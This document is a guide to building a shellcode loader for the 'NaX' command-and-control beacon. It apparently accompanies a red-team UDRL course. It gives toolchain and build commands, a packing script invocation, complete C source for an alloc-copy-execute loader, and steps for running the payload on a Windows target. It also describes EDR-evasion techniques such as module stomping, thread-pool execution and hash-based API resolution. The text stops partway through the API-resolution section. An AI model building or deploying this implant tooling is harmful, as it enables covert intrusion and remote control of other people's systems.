# Stardust Loader Guide

This page documents the NaX UDRL (User-Defined Reflective Loader) architecture and walks through building a Stardust-based loader from scratch. It is written as a companion to the [ZeroPoint Security UDRL course](https://training.zeropointsecurity.co.uk/) - if you are following that material, this page explains how NaX maps each concept into production code and what you need to change to make a custom loader work with the NaX beacon.

## Table of Contents

- [Quickstart: Compile, Pack, and Run](#quickstart-compile-pack-and-run)
  - [Prerequisites](#prerequisites)
  - [Step 1: Build the Beacon](#step-1-build-the-beacon)
  - [Step 2: Build the Loader](#step-2-build-the-loader)
  - [Step 3: Pack Into Final Shellcode](#step-3-pack-into-final-shellcode)
  - [Step 4: Run on Target](#step-4-run-on-target)
  - [What Happens at Runtime](#what-happens-at-runtime)
  - [Build Shortcuts](#build-shortcuts)
  - [Using Stock Stardust as a Loader (Minimal PoC)](#using-stock-stardust-as-a-loader-minimal-poc)
- [What is Stardust?](#what-is-stardust)
- [Memory Layout at Runtime](#memory-layout-at-runtime)
- [Source Tree](#source-tree)
- [Section Ordering and the Linker Script](#section-ordering-and-the-linker-script)
- [Execution Flow](#execution-flow)
  - [Stage 0: Entry.asm](#stage-0-entryasm)
  - [Stage 1: PreMain.c](#stage-1-premainc)
  - [Stage 2: Main.c](#stage-2-mainc)
- [The INSTANCE Struct](#the-instance-struct)
  - [Why TLS Instead of a Global Section](#why-tls-instead-of-a-global-section)
  - [The Egghunter Pattern](#the-egghunter-pattern)
  - [STARDUST_INSTANCE Retrieval](#stardust_instance-retrieval)
- [API Resolution](#api-resolution)
  - [LdrModulePeb - PEB Walk](#ldrmodulepeb--peb-walk)
  - [LdrFunction - Export Table Walk](#ldrfunction--export-table-walk)
  - [Forwarded Exports](#forwarded-exports)
  - [Compile-Time Hashing](#compile-time-hashing)
  - [D_API / RESOLVE Macros](#d_api--resolve-macros)
- [NaxHeader v2](#naxheader-v2)
  - [Header Layout](#header-layout)
  - [Locating the Header](#locating-the-header)
  - [v1 Fallback](#v1-fallback)
- [Technique Dispatch](#technique-dispatch)
  - [VirtualAlloc Path](#virtualalloc-path)
  - [Module Stomp Path](#module-stomp-path)
  - [Execution Transfer](#execution-transfer)
- [Build System](#build-system)
  - [Toolchain](#toolchain)
  - [Compiler Flags](#compiler-flags)
  - [Build Pipeline](#build-pipeline)
  - [Packing (pack_nax.py)](#packing-pack_naxpy)
- [Writing Your Own Loader from Scratch](#writing-your-own-loader-from-scratch)
  - [Step 1: Assembly Entry Point](#step-1-assembly-entry-point)
  - [Step 2: PEB Walk and Module Resolution](#step-2-peb-walk-and-module-resolution)
  - [Step 3: TLS Egghunter for Global State](#step-3-tls-egghunter-for-global-state)
  - [Step 4: Build the INSTANCE Struct](#step-4-build-the-instance-struct)
  - [Step 5: Export Table Walk with Forwarding](#step-5-export-table-walk-with-forwarding)
  - [Step 6: Parse NaxHeader v2](#step-6-parse-naxheader-v2)
  - [Step 7: VirtualAlloc Execution (Simplest Path)](#step-7-virtualalloc-execution-simplest-path)
  - [Step 8: Module Stomping](#step-8-module-stomping)
  - [Step 9: .pdata/.xdata Unwind Stomping](#step-9-pdataxdata-unwind-stomping)
  - [Step 10: Thread Pool Execution Transfer](#step-10-thread-pool-execution-transfer)
  - [Step 11: Remove Build Padding](#step-11-remove-build-padding)
- [PIC Rules Reference](#pic-rules-reference)
- [Debugging Tips](#debugging-tips)
- [Test Harnesses](#test-harnesses)

---

## Quickstart: Compile, Pack, and Run

This section walks through the fastest path from source to running beacon: build the beacon, build the loader, pack them together, and execute the final shellcode on a Windows target. Uses VirtualAlloc + CreateThread - no module stomping, no thread pool - the simplest path to get executing.

### Prerequisites

Install the cross-compilation toolchain on Kali/Debian:

```bash
sudo apt install mingw-w64 nasm binutils python3
```

Verify you have:

```bash
x86_64-w64-mingw32-gcc --version    # beacon cross-compiler
x86_64-w64-mingw32-g++ --version    # loader cross-compiler (C++ for constexpr hashing)
nasm --version                       # assembler for Entry.asm / Stardust.asm
objcopy --version                    # extracts raw .text from linked PEs
python3 --version                    # packer script (pack_nax.py)
```

### Step 1: Build the Beacon

The beacon is a standalone PIC shellcode blob compiled from `src_beacon/`. It produces a raw `.text` section extraction:

```bash
cd <nax-root>
make beacon
```

This compiles all beacon source files with MinGW, links them with a custom linker script, then uses `objcopy --dump-section .text` to extract the raw shellcode. The outputs land in `src_beacon/build/http/`:

```
src_beacon/build/http/
  beacon.x64.bin           # raw beacon shellcode (.text bytes)
  beacon.pdata.bin         # .pdata section (RUNTIME_FUNCTION entries)
  beacon.xdata.bin         # .xdata section (UNWIND_INFO structures)
  beacon.text_rva          # text file containing the beacon's .text RVA (for unwind fixup)
```

For a debug build (includes `AllocConsole` + debug output):

```bash
make -C src_beacon debug
```

**Before building:** The beacon embeds its C2 configuration at compile time via `src_beacon/include/Config.h`. This file is generated by the Adaptix server plugin (`src_server/agent_nonameax/`) during payload generation. For standalone testing, you can edit it manually - it contains the C2 URL, sleep time, jitter, and malleable profile bytes.

### Step 2: Build the Loader

The loader is a Stardust-pattern PIC shellcode that finds the beacon appended after itself, allocates memory, copies the beacon in, and transfers execution.

```bash
make loader
```

For the simplest path (VirtualAlloc + CreateThread), override the technique defaults:

```bash
make loader NAX_STOMP_MODE=0 NAX_EXEC_MODE=0
```

| Variable | Value | Effect |
|----------|-------|--------|
| `NAX_STOMP_MODE=0` | VirtualAlloc | Allocates private RW memory, copies beacon, flips to RX |
| `NAX_STOMP_MODE=1` | Module Stomp (default) | Loads a sacrificial DLL, stomps its .text with the beacon |
| `NAX_EXEC_MODE=0` | CreateThread | Starts beacon on a new thread (start addr = beacon entry) |
| `NAX_EXEC_MODE=1` | Thread Pool (default) | Runs beacon as TpWork item (start addr = TppWorkerThread) |

Output: `src_loader/bin/nax_loader.x64.bin` - the raw loader shellcode.

### Step 3: Pack Into Final Shellcode

The packer script (`scripts/pack_nax.py`) concatenates the loader, a 160-byte NaxHeader v2, and the beacon into a single shellcode blob:

```bash
python3 scripts/pack_nax.py \
    --loader  src_loader/bin/nax_loader.x64.bin \
    --beacon  src_beacon/build/http/beacon.x64.bin \
    --pdata   src_beacon/build/http/beacon.pdata.bin \
    --xdata   src_beacon/build/http/beacon.xdata.bin \
    --text-rva src_beacon/build/http/beacon.text_rva \
    --output  build/nax.x64.bin
```

For the simplest path (no module stomping flags):

```bash
mkdir -p build
python3 scripts/pack_nax.py \
    --loader  src_loader/bin/nax_loader.x64.bin \
    --beacon  src_beacon/build/http/beacon.x64.bin \
    --pdata   src_beacon/build/http/beacon.pdata.bin \
    --xdata   src_beacon/build/http/beacon.xdata.bin \
    --text-rva src_beacon/build/http/beacon.text_rva \
    --output  build/nax.x64.bin
```

Without `--module-stomp` and `--stomp-pdata`, the header flags field is 0x0000. The loader ignores .pdata/.xdata and just allocates + copies + executes.

The final binary layout:

```
build/nax.x64.bin
  [ LOADER shellcode ][ NaxHeader v2 (160 bytes) ][ BEACON shellcode ][ .pdata ][ .xdata ]
```

### Step 4: Run on Target

Transfer `build/nax.x64.bin` and `stomper.exe` to a Windows x64 target.

**Compile the test launcher** (one-time, on the Linux build box):

```bash
x86_64-w64-mingw32-gcc src_loader/scripts/stomper.c -o build/stomper.exe -lkernel32
```

**On the Windows target:**

```
stomper.exe nax.x64.bin
```

Output:

```
[*] loaded "nax.x64.bin" (87432 bytes)
[*] shellcode @ 0x000001A23F4C0000  RX
[*] press enter to execute...
```

The launcher:
1. Reads the file into a `PAGE_READWRITE` buffer
2. Flips to `PAGE_EXECUTE_READ`
3. Waits for Enter (attach a debugger here if needed)
4. `CreateThread` into the buffer at offset 0 (the loader's `Start` label)
5. `WaitForSingleObject(INFINITE)` - the process stays alive while the beacon runs

The loader takes over from here: it resolves APIs from the PEB, finds the NaxHeader at the end of its own code, reads the beacon size, allocates fresh RW memory, copies the beacon, flips to RX, and starts execution.

### What Happens at Runtime

Here is the full execution chain for the simplest path (VirtualAlloc + CreateThread):

```
stomper.exe
  └─ CreateThread → buf[0]
       │
       ▼
  Entry.asm (Start)                    .text$A - loader base
       │  push rsi; align stack; call PreMain
       ▼
  PreMain.c                            .text$B
       │  PEB walk → ntdll, kernel32
       │  Resolve RtlAllocateHeap, TlsAlloc/Set/Free
       │  TLS egghunter → consecutive slot pair
       │  Heap-allocate INSTANCE, store in TLS
       │  call Main()
       ▼
  Main.c                               .text$B
       │  STARDUST_INSTANCE (retrieve from TLS)
       │  Resolve: NtAllocateVirtualMemory, VirtualProtect, CreateThread
       │  hdr = LOADER_END()  (= loader base + loader size)
       │  Validate magic == 0x4E415832
       │  beacon_src = hdr + 160
       │  beacon_size = HDR_U32(hdr, 4)
       │
       │  NaxAllocExec(beacon_src, beacon_size):
       │    NtAllocateVirtualMemory(RW, page-aligned)
       │    MmCopy(exec_buf, beacon_src, beacon_size)
       │    VirtualProtect(exec_buf, RX)
       │    return exec_buf
       │
       │  NaxExecThread(exec_buf):
       │    CreateThread(exec_buf)
       ▼
  Beacon NaxMain()                     runs in fresh RX private memory
       │  Resolves its own APIs (NaxGetModule + NaxGetProc)
       │  Initializes NAX_INSTANCE, parses C2 config
       │  Enters heartbeat loop (GET → sleep → POST results)
       └─ ...
```

### Build Shortcuts

The top-level Makefile wraps all three steps into a single command:

```bash
# Simplest path: VirtualAlloc + CreateThread, no stomping
make clean && make NAX_STOMP_MODE=0 NAX_EXEC_MODE=0

# Module stomp + thread pool (production defaults)
make clean && make MODULE_STOMP=1

# Module stomp + .pdata unwind stomping + custom DLL
make clean && make MODULE_STOMP=1 STOMP_PDATA=1 STOMP_DLL=mshtml.dll

# Debug build (beacon has console output)
make clean && make debug NAX_STOMP_MODE=0 NAX_EXEC_MODE=0

# Incremental rebuild (only recompile Config.c + re-link + re-pack)
make link
make debug-link
```

All output goes to `build/nax.x64.bin` (release) or `build/nax.x64.debug.bin` (debug).

### Using Stock Stardust as a Loader (Minimal PoC)

If you want to skip the full NaX loader and just get the NaX beacon executing from the stock [Stardust](https://github.com/5pider/Stardust) template, you only need to modify two files: `include/Common.h` (add API declarations) and `src/Main.c` (replace MessageBox with alloc-copy-protect-run). Everything else - Entry.asm, PreMain.c, Ldr.c, the linker script, the makefile - stays untouched.

This PoC uses the stock Stardust global-section INSTANCE (not TLS), the stock `build.py` packer, and appends the raw beacon bytes after the loader. No NaxHeader, no module stomping, no thread pool - just the absolute minimum to prove the beacon runs.

#### Step 1: Build the beacon only

```bash
cd <nax-root>
make beacon
```

This produces `src_beacon/build/http/beacon.x64.bin` - the raw beacon `.text` shellcode.

#### Step 2: Modify `include/Common.h`

Replace the INSTANCE struct to declare the APIs needed for alloc + protect + execute:

```c
#ifndef STARDUST_COMMON_H
#define STARDUST_COMMON_H

#include <windows.h>
#include <Native.h>
#include <Macros.h>
#include <Ldr.h>
#include <Defs.h>
#include <Utils.h>

EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

typedef struct _INSTANCE {

    BUFFER Base;

    struct {
        D_API( RtlAllocateHeap        )
        D_API( NtProtectVirtualMemory  )
        D_API( NtAllocateVirtualMemory )
        D_API( VirtualProtect          )
        D_API( CreateThread            )
    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernel32;
    } Modules;

} INSTANCE, *PINSTANCE;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

VOID Main( _In_ PVOID Param );

#endif
```

Changes from stock: removed `LoadLibraryW`, `MessageBoxW`, `User32` module. Added `NtAllocateVirtualMemory`, `VirtualProtect`, `CreateThread`.

#### Step 3: Replace `src/Main.c`

This is the entire Main.c - alloc RW, copy beacon, flip to RX, CreateThread:

```c
#include <Common.h>
#include <Constexpr.h>

FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE

    /* ========= [ resolve modules ] ========= */
    if ( !( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) )
        return;
    if ( !( Instance()->Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) )
        return;

    /* ========= [ resolve APIs ] ========= */
    if ( !( Instance()->Win32.NtAllocateVirtualMemory =
            LdrFunction( Instance()->Modules.Ntdll, HASH_STR( "NtAllocateVirtualMemory" ) ) ) )
        return;
    if ( !( Instance()->Win32.VirtualProtect =
            LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect" ) ) ) )
        return;
    if ( !( Instance()->Win32.CreateThread =
            LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) ) ) )
        return;

    /* ========= [ locate beacon bytes appended after loader ] ========= */

    /*
     * Memory layout after packing:
     *   [ LOADER shellcode ][ beacon_size (4 bytes) ][ BEACON shellcode ]
     *
     * IMPORTANT: Do NOT call StRipEnd() here. PreMain.c zeros .text$E
     * (the section containing StRipEnd code) as an anti-fingerprint
     * measure. Calling StRipEnd() after PreMain returns will execute
     * zeroed memory and crash.
     *
     * Instead, use Base.Buffer + Base.Length - PreMain saved these
     * values before zeroing .text$E.
     */
    PVOID after_loader = C_PTR( U_PTR( Instance()->Base.Buffer ) + Instance()->Base.Length );
    ULONG beacon_size  = C_DEF32( after_loader );
    PVOID beacon_src   = C_PTR( U_PTR( after_loader ) + sizeof( UINT32 ) );

    if ( !beacon_size || beacon_size > 512 * 1024 )
        return;

    /* ========= [ alloc RW ] ========= */
    PVOID  exec_buf  = NULL;
    SIZE_T alloc_size = ( (SIZE_T)beacon_size + 0xFFFu ) & ~(SIZE_T)0xFFFu;
    ULONG  old_prot   = 0;

    if ( !NT_SUCCESS( Instance()->Win32.NtAllocateVirtualMemory(
            NtCurrentProcess(), &exec_buf, 0, &alloc_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) )
        return;

    /* ========= [ copy beacon ] ========= */
    MmCopy( exec_buf, beacon_src, beacon_size );

    /* ========= [ flip to RX ] ========= */
    if ( !Instance()->Win32.VirtualProtect(
            exec_buf, alloc_size, PAGE_EXECUTE_READ, &old_prot ) )
        return;

    /* ========= [ execute ] ========= */
    Instance()->Win32.CreateThread( NULL, 0,
        (LPTHREAD_START_ROUTINE)exec_buf, NULL, 0, NULL );
}
```

That's it. No NaxHeader parsing, no module stomping, no thread pool - the simplest possible alloc-copy-protect-run.

#### Step 4: Build the Stardust loader

```bash
cd /path/to/Stardust
make
```

This produces `bin/stardust.x64.bin` - the loader shellcode (page-padded by `build.py`).

#### Step 5: Pack loader + beacon

Use `pack_nax.py` with the `--legacy` flag. This produces the v1 format (4-byte beacon_size header instead of NaxHeader v2) that the stock Stardust `Main.c` expects. The script automatically strips the page-padding that `build.py` adds to the loader, then re-aligns to 16 bytes so the beacon_size field lands exactly where `Base.Length` points.

```bash
python3 scripts/pack_nax.py \
    --loader  /path/to/Stardust/bin/stardust.x64.bin \
    --beacon  src_beacon/build/http/beacon.x64.bin \
    --output  poc_nax.bin \
    --legacy
```

> **Why `--legacy`?** The stock Stardust `Main.c` reads a plain `UINT32` beacon_size at `after_loader`, not the 160-byte NaxHeader v2. The `--legacy` flag tells the packer to emit the v1 format: `[ loader ][ 4-byte size ][ beacon ]`.
>
> **Why padding stripping matters:** Stock Stardust's `build.py` pads the extracted shellcode to page boundaries (e.g. 8192 bytes), but `Base.Length` is computed from `StRipEnd() - StRipStart()` before the padding (e.g. 4128 bytes). If you append the beacon at the padded file end, the loader reads zeros at offset 4128 instead of the beacon_size - giving "Invalid beacon size: 0". The packer strips trailing zeros and re-pads to 16-byte alignment (NASM section default) so the data lands where the loader expects it.

#### Step 6: Run on target

Use any shellcode runner. The simplest - compile `stomper.c` from the NaX repo:

```bash
x86_64-w64-mingw32-gcc \
    src_loader/scripts/stomper.c \
    -o stomper.exe -lkernel32
```

On the Windows target:

```
stomper.exe poc_nax.bin
```

The flow: `stomper.exe` → `CreateThread` → Stardust `Start` → `PreMain` (PEB walk, `.global` INSTANCE) → `Main` (resolve APIs, read beacon size at `Base.Buffer + Base.Length`, alloc RW, copy, RX, `CreateThread`) → NaX beacon `NaxMain()` starts heartbeat loop.

#### What this PoC does NOT have

| Missing | Why it matters | NaX loader has it |
|---------|---------------|-------------------|
| NaxHeader v2 | No stomp-DLL name, no flags, no .pdata/.xdata offsets | Yes (160-byte header) |
| Module stomping | Beacon runs from PRV memory (EDR-visible) | Yes (image-backed) |
| Thread pool execution | Beacon thread start addr = beacon entry (scannable) | Yes (TppWorkerThread) |
| TLS INSTANCE storage | Uses `.global` section + `NtProtectVirtualMemory` to write (OPSEC risk) | Yes (TLS egghunter) |
| .pdata/.xdata unwind | Stack walks produce garbage frames | Yes (unwind stomping) |
| Padding removal | Wastes up to 4KB per page-aligned loader | Yes (objcopy, no padding) |

This is intentionally the bare minimum. Once the PoC works, upgrade to the full NaX loader path for production use.

---

## What is Stardust?

[Stardust](https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/) is a position-independent code (PIC) framework created by Paul Ungur (5pider). It provides the foundational template that the ZeroPoint Security UDRL course builds on. The core idea:

1. Compile C code into a PE with a single `.text` section - no imports, no CRT, no relocations.
2. Extract that `.text` section as raw bytes. The result is position-independent shellcode.
3. At runtime, the shellcode resolves everything it needs from the PEB (Process Environment Block) and has no dependencies on the host process.

NaX's loader (`src_loader/`) is a direct implementation of this pattern, extended with NaxHeader parsing, module stomping, and thread pool execution transfer.

## Memory Layout at Runtime

When the combined `nax.x64.bin` payload executes, the on-disk layout maps directly to memory:

```
                       nax.x64.bin (on disk / in memory after initial load)
  +=====================================================================+
  |                                                                     |
  |  [  LOADER  ][ NAX HEADER v2 ][ BEACON ][ .pdata ][ .xdata ]       |
  |  ^           ^                 ^         ^         ^                |
  |  |           |                 |         |         |                |
  |  StRipStart  LOADER_END()     +HDR_SZ   +beacon   +pdata           |
  |  (Base.Buffer)                                                      |
  |                                                                     |
  +=====================================================================+

  Loader size  = StRipEnd() - StRipStart() = Base.Length
  Header ptr   = StRipStart() + Base.Length = LOADER_END()
  Beacon ptr   = LOADER_END() + NAX_HDR_SIZE (160 bytes)
  Pdata ptr    = beacon_ptr + beacon_size
  Xdata ptr    = pdata_ptr + pdata_size
```

The loader never modifies this initial blob. It reads from it to find the beacon bytes, then copies the beacon into its final execution location (VirtualAlloc buffer or stomped DLL `.text` section).

## Source Tree

```
src_loader/
  asm/x64/
    Stardust.asm       # PIC entry point (.text$A) and end marker (.text$E)
  include/
    Common.h           # INSTANCE struct, D_API macro, forward declarations
    Constexpr.h        # Compile-time hashing (HASH_STR / ExprHashStringA)
    Defs.h             # BUFFER typedef, hash constants, NaxHeader v2 defines,
                       #   technique selection constants (NAX_STOMP_*, NAX_EXEC_*)
    Ldr.h              # LdrModulePeb / LdrFunction declarations
    Loader.h           # NaxPeHeaders, NaxFindSection, NaxModuleStomp, NaxExec* decls
    Macros.h           # D_API, D_SEC, FUNC, casting macros, MmCopy/MmZero,
                       #   STARDUST_INSTANCE, MOD/API/RESOLVE, HDR_*, LOADER_END
    Native.h           # ntdll structures (PEB, TEB, LDR_DATA_TABLE_ENTRY, etc.)
    Utils.h            # HashString declaration
  src/
    PreMain.c          # First C code: PEB walk, TLS egghunter, INSTANCE allocation
    Main.c             # API resolution, NaxHeader parsing, technique dispatch
    Ldr.c              # LdrModulePeb (PEB walk), LdrFunction (export walk + forwarding)
    Pe.c               # PE header helpers: NaxPeHeaders, NaxFindSection, NaxFindSectionByDir
    Stomp.c            # Module stomping: NaxModuleStomp, NaxPatchLdr
    Exec.c             # Execution transfer: NaxExecThreadPool, NaxExecThread
    Utils.c            # HashString (FNV1a, case-insensitive)
  scripts/
    Linker.ld          # Linker script for section ordering
    build.py           # Original Stardust extractor (not used - objcopy replaces it)
    loader.c           # Dev launcher: load shellcode into RWX, execute
    stomper.c          # Dev launcher: load nax.bin, RX, CreateThread
  Makefile             # Build the loader .bin
```

## Section Ordering and the Linker Script

PIC shellcode has no loader (ironic) to fix up sections at runtime. Everything must live in a single flat `.text` section. The linker script (`scripts/Linker.ld`) merges all compiler output into one section with a specific order:

```
SECTIONS {
    .text : {
        *( .text$A );       # ASM entry stubs (Start, StRipStart)
        *( .text$B );       # All C code (PreMain, Main, Ldr, Pe, Stomp, Exec, Utils)
        *( .rdata* );       # Read-only data (WCHAR array initializers lifted by -Os)
        *( .data* );        # Writable data  (compound initializer copies)
        *( .text$E );       # ASM end marker (StRipEnd)
    }
}
```

The MSVC/MinGW convention sorts sections alphabetically within a group, so `$A` comes before `$B` comes before `$E`. The `D_SEC(x)` and `FUNC` macros in `Macros.h` place all C functions into `.text$B`:

```c
#define D_SEC( x )  __attribute__( ( section( ".text$" #x "" ) ) )
#define FUNC        D_SEC( B )
```

Why `.rdata` and `.data` inside `.text`? The `-Os` optimization level can lift local `WCHAR` array initializers into `.rdata` or `.data`. Without this merging, those bytes would end up in separate PE sections that get discarded by `objcopy --dump-section .text`. With them merged into `.text`, the loader's RIP-relative references to those initializers still work in the extracted shellcode.

Why `.text$E` must be last? `StRipEnd()` returns its own address plus the size of `.text$E` (16 bytes). That address must be one byte past the end of the loader - it is the start of the NaxHeader. If any section comes after `.text$E`, the calculation is wrong and the header parse reads garbage.

## Execution Flow

### Stage 0: Entry.asm

`Stardust.asm` lives in `.text$A` - it is the first code in the shellcode blob.

```nasm
;; .text$A
Start:
    push  rsi               ; save non-volatile register
    mov   rsi, rsp          ; save original stack pointer
    and   rsp, 0FFFFFFFFFFFFFFF0h  ; 16-byte align the stack
    sub   rsp, 020h         ; shadow space (Win64 ABI)
    call  PreMain           ; transfer to C
    mov   rsp, rsi          ; restore stack
    pop   rsi               ; restore register
    ret                     ; return to caller (shellcode runner)
```

The entry point saves registers, aligns the stack for the Win64 calling convention, calls `PreMain`, then restores everything and returns. This is the entire lifecycle of the loader - when `PreMain` (and everything it calls) returns, the shellcode is done and control goes back to whatever executed the shellcode.

**StRipStart()** returns the address of `Start` itself - the base address of the loader blob in memory. It works by reading the return address pushed by `call StRipPtrStart` and subtracting a fixed offset (0x1b = 27 bytes, the distance from `Start` to that return address).

**StRipEnd()** lives in `.text$E` and returns the address one past its own last byte - the first byte after the loader. Same RIP-relative trick: read the return address, add the known size of `.text$E` (16 bytes, padded with an explicit `nop` to avoid alignment gaps).

### Stage 1: PreMain.c

PreMain is the first C function called. It sets up the INSTANCE (global state container) and stores it in TLS.

```
PreMain flow:
  1. Zero a stack-local INSTANCE struct
  2. Record loader base:  Base.Buffer = StRipStart()
  3. Record loader size:  Base.Length  = StRipEnd() - StRipStart()
  4. PEB walk: resolve ntdll.dll base address
  5. Resolve ntdll!RtlAllocateHeap
  6. PEB walk: resolve kernel32.dll base address
  7. Resolve kernel32!TlsAlloc, TlsSetValue, TlsFree
  8. TLS egghunter: allocate consecutive slot pair (see below)
  9. Heap-allocate INSTANCE: RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, sizeof(INSTANCE))
  10. Store NtCurrentPeb() in slot N (the "egg")
  11. Store INSTANCE pointer in slot N+1
  12. Copy stack-local INSTANCE into heap allocation
  13. Zero the stack-local copy (prevent leak)
  14. Call Main(Param)
```

Every API call in PreMain is resolved on the spot from the PEB - there is no existing INSTANCE to read from yet. After PreMain finishes, all subsequent code uses the `STARDUST_INSTANCE` macro to retrieve the heap-allocated INSTANCE from TLS.

### Stage 2: Main.c

Main resolves technique-specific APIs, parses the NaxHeader, and dispatches to the appropriate execution path.

```
Main flow:
  1. STARDUST_INSTANCE - retrieve INSTANCE from TLS
  2. Re-resolve kernel32 + ntdll module handles (store in INSTANCE)
  3. Resolve shared APIs: NtProtectVirtualMemory, VirtualProtect
  4. Resolve technique-specific APIs (compile-time selected):
     - STOMP_VIRTUAL: NtAllocateVirtualMemory
     - STOMP_MODULE:  LoadLibraryExW
     - EXEC_THREAD:   CreateThread
     - EXEC_THREADPOOL: TpAllocWork, TpPostWork, TpReleaseWork
  5. Locate NaxHeader: hdr = LOADER_END()
  6. Read magic field; validate against NAX_HDR_MAGIC (0x4E415832)
  7. Parse beacon_size, pdata_size, xdata_size, text_rva, dll_name
  8. Compute beacon_src = hdr + NAX_HDR_SIZE (160)
  9. Dispatch:
     - STOMP_MODULE: NaxModuleStomp(hdr, beacon_src, ..., dll_name)
     - STOMP_VIRTUAL: NaxAllocExec(beacon_src, beacon_size)
  10. Transfer execution:
     - EXEC_THREADPOOL: NaxExecThreadPool(entry)
     - EXEC_THREAD:     NaxExecThread(entry)
```

## The INSTANCE Struct

The INSTANCE is the loader's equivalent of global variables - a heap-allocated struct containing all resolved API function pointers and module handles.

```c
typedef struct _INSTANCE {
    BUFFER Base;              // { Buffer = StRipStart(), Length = loader size }

    struct {
        // ntdll
        D_API( RtlAllocateHeap )
        D_API( NtProtectVirtualMemory )
        D_API( VirtualProtect )

        // kernel32 (TLS management)
        D_API( TlsAlloc )
        D_API( TlsSetValue )
        D_API( TlsFree )

        // Conditional on NAX_STOMP_MODE / NAX_EXEC_MODE:
        D_API( NtAllocateVirtualMemory )  // STOMP_VIRTUAL only
        D_API( LoadLibraryExW )           // STOMP_MODULE only
        D_API( TpAllocWork )              // EXEC_THREADPOOL only
        D_API( TpPostWork )               // EXEC_THREADPOOL only
        D_API( TpReleaseWork )            // EXEC_THREADPOOL only
        D_API( CreateThread )             // EXEC_THREAD only
    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernel32;
    } Modules;
} INSTANCE;
```

`D_API(x)` expands to `__typeof__(x) * x;` - a type-safe function pointer declaration that matches the exact signature of the Win32 API. No manual signature typing needed.

### Why TLS Instead of a Global Section

The original Stardust template stores the INSTANCE pointer in a `.global` section within the shellcode blob itself. This works, but writing to the loader's own memory requires calling `NtProtectVirtualMemory` to flip the page from RX to RW and back - an extra syscall that:

1. Is an OPSEC risk (EDRs hook `NtProtectVirtualMemory` and flag RX-to-RW transitions on executable regions).
2. Is unnecessary - TLS slots are already writable and accessible from any thread without any protection changes.

NaX uses TLS instead: the INSTANCE pointer lives in the TEB's TlsSlots array, which is per-thread, always writable, and requires no protection changes.

### The Egghunter Pattern

The problem: how does code that runs on a different thread (the beacon, running on the thread pool) find the INSTANCE pointer? It cannot use `TlsGetValue` because that would require knowing the slot index, which would mean storing the index somewhere... which is the same problem.

Solution: store a known "egg" value in slot N, and the INSTANCE pointer in slot N+1. The egg is `NtCurrentPeb()` - a value that is unique per process, stable, and readable without any API calls (it comes directly from the TEB's `ProcessEnvironmentBlock` field).

To find the INSTANCE, any code on any thread can walk `TlsSlots[0..63]` looking for an entry that matches `NtCurrentPeb()`, then read the next slot.

The allocation in PreMain:

```c
#define TLS_SEARCH_LIMIT 20

DWORD  slots[TLS_SEARCH_LIMIT] = { 0 };
UINT32 slotCount = 0;
DWORD  eggSlot   = TLS_OUT_OF_INDEXES;
DWORD  instSlot  = TLS_OUT_OF_INDEXES;

for ( UINT32 i = 0; i < TLS_SEARCH_LIMIT; i++ ) {
    slots[i] = TlsAlloc();
    if ( slots[i] == TLS_OUT_OF_INDEXES ) break;
    slotCount++;

    if ( i > 0 && slots[i] == slots[i - 1] + 1 ) {
        eggSlot  = slots[i - 1];   // consecutive pair found
        instSlot = slots[i];
        break;
    }
}

// Free non-consecutive slots allocated during the search
for ( UINT32 i = 0; i < slotCount; i++ ) {
    if ( slots[i] != eggSlot && slots[i] != instSlot )
        TlsFree( slots[i] );
}

TlsSetValue( eggSlot,  (LPVOID)NtCurrentPeb() );  // the egg
TlsSetValue( instSlot, Inst );                     // INSTANCE pointer
```

Why consecutive? The retrieval code walks the TlsSlots array (a raw array in the TEB) looking for the PEB pointer. It reads `TlsSlots[i+1]` to get the INSTANCE. If the slots were not consecutive, `i+1` would point to some other thread's TLS data.

### STARDUST_INSTANCE Retrieval

Every function that needs the INSTANCE starts with:

```c
STARDUST_INSTANCE
```

This expands to:

```c
PINSTANCE __LocalInstance = InstancePtr();
```

Which calls `__TlsFindInstance()`:

```c
static __inline__ PVOID __TlsFindInstance( void ) {
    PVOID peb = C_PTR( NtCurrentPeb() );
    PTEB  teb = NtCurrentTeb();
    for ( UINT32 i = 0; i < 63; i++ ) {
        if ( teb->TlsSlots[i] == peb )
            return teb->TlsSlots[i + 1];
    }
    return C_PTR( 0 );
}
```

No API calls. No hash lookups. Just a linear scan of 63 TLS slots per invocation. The `Instance()` macro then casts the result to `PINSTANCE` for field access.

## API Resolution

### LdrModulePeb -- PEB Walk

`LdrModulePeb(hash)` finds a loaded DLL by hashing each module name in the PEB's `InLoadOrderModuleList` and comparing against the target hash.

```c
FUNC PVOID LdrModulePeb( ULONG Hash ) {
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    Head  = &NtCurrentPeb()->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    for ( ; Head != Entry; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );
        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash )
            return Data->DllBase;
    }
    return NULL;
}
```

`NtCurrentPeb()` reads the PEB pointer directly from the TEB (Thread Environment Block) via `gs:[0x60]` on x64. No API call needed. The `Ldr` field points to `PEB_LDR_DATA`, which contains the doubly-linked list of loaded modules.

Pre-computed module hashes in `Defs.h`:

```c
#define H_MODULE_NTDLL    0x318a7963
#define H_MODULE_KERNEL32 0x04a1a06a
```

### LdrFunction -- Export Table Walk

`LdrFunction(module, hash)` walks a DLL's PE export directory to find a function by its name hash.

```
LdrFunction flow:
  1. Validate module base + parse DOS/NT headers
  2. Locate IMAGE_EXPORT_DIRECTORY from DataDirectory[0]
  3. Iterate AddressOfNames:
     a. Hash each exported function name
     b. Compare against target hash
  4. On match: resolve via AddressOfNameOrdinals -> AddressOfFunctions
  5. Check if address falls within the export directory (= forwarded export)
